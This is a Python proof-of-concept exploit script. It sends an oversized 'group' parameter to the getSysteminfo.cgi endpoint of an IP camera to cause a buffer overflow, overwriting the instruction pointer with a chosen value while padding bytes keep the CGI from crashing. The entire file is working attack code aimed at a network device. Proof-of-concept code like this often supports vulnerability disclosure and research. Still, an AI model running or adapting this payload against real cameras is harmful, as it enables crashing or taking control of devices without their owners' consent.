#!/usr/bin/env python

'''
# Description  

    POC to trigger buffer overflow
'''

import socket
import struct

CAMERA_IP   = '<your-ip-here>' # example= '192.168.178.23'
CAMERA_PORT = 80
target = (CAMERA_IP, CAMERA_PORT)

INSTRUCTION_POINTER = 0x47474747

# values to prevent cgi from crashing
PASS1 = b'\x2A\xAE\x41\x41'
PASS2 = b'\x2A\xB4\xF1\xA4'

# payload starts here
payload =  b'group=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
payload += b'_'+(b'A'*119+b'_')*7
payload += PASS1
payload += b'CCCC'
payload += struct.pack(">I", INSTRUCTION_POINTER)
payload += PASS2

GET_REQUEST = b'GET /camera-cgi/public/getSysteminfo.cgi?'
GET_REQUEST+=payload
GET_REQUEST+=b' HTTP/1.1\r\n\r\n'

print("[+] Open socket")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("[+] Connecting to {0}".format(target[0]))
s.connect(target)

print("[+] Sending payload..")
resp = ''

s.sendall(GET_REQUEST)
result = s.recv(10000)
print(result.decode())
print("[+] Closing socket.")
s.close()
